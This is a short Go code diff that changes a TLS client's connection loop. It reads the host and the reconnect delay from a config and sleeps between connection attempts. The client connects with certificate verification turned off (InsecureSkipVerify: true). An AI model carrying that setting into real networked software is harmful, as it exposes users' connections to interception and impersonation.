@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"time"
 )
 
 func main() {
@@ -13,23 +14,23 @@ func main() {
 	}
 
 	for {
-		host := "localhost:9999"
+		host := Config.Host
 		fmt.Println("Connecting to", host)
 
 		conn, err := tls.Dial("tcp", host, &tls.Config{
 			InsecureSkipVerify: true,
 		})
 
-		if err != nil {
-			fmt.Println(err.Error())
-			continue
-		}
-
-		Queue = make(chan OutgoingPacket)
-
 		con := Connection{
 			Conn: conn,
 		}
+
+		if err != nil {
+			fmt.Println(err.Error())
+			goto end
+		}
+
+		Queue = make(chan OutgoingPacket)
 
 		go func() {
 			for {
@@ -58,5 +59,9 @@ func main() {
 				break
 			}
 		}
+
+	end:
+
+		time.Sleep(time.Second * time.Duration(Config.Delay))
 	}
 }
